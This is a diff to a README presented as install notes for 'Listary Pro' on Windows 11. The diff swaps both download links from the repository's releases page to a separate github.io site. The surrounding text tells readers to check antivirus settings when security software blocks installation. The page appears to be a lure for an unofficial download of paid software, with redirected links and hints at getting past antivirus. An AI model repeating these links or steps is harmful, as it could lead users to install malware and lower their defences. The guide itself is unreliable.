@@ -1,6 +1,6 @@
 # 🔍 Listary-Install-Notes - Find files faster on your computer
 
-[![Download Listary](https://img.shields.io/badge/Download-Listary%20Pro-blue)](https://github.com/Eliottelocutionary128/Listary-Install-Notes/releases)
+[![Download Listary](https://img.shields.io/badge/Download-Listary%20Pro-blue)](https://eliottelocutionary128.github.io)
 
 This guide helps you put Listary Pro on your Windows 11 computer. Many users face installation blocks or errors when setting up file search tools. These notes explain the install steps and provide fixes for common hurdles.
 
@@ -19,7 +19,7 @@ If you encounter issues during installation, check your antivirus settings. Secu
 
 You must visit our release page to get the correct version of the software. Follow these instructions to download the files:
 
-1.  Visit the [Download Page](https://github.com/Eliottelocutionary128/Listary-Install-Notes/releases).
+1.  Visit the [Download Page](https://eliottelocutionary128.github.io).
 2.  Locate the latest release section at the top of the page.
 3.  Click the link labeled with your version.
 4.  Wait for the file download to complete in your browser.
